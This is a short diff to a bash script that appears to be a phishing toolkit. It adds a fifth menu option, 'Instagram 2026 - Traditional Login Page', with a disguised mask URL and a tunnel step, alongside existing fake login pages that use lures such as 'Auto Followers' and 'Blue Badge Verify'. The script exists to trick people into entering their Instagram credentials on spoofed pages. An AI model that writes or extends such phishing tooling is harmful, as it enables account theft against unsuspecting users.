@@ -648,6 +648,7 @@ site_instagram() {
 		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		${RED}[${WHITE}05${RED}]${ORANGE} Instagram 2026 - Traditional Login Page
 
 	EOF
 
@@ -669,6 +670,10 @@ site_instagram() {
 		4 | 04)
 			website="ig_verify"
 			mask='https://blue-badge-verify-for-instagram-free'
+			tunnel_menu;;
+		5 | 05)
+			website="instagram26"
+			mask='https://instagram26'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
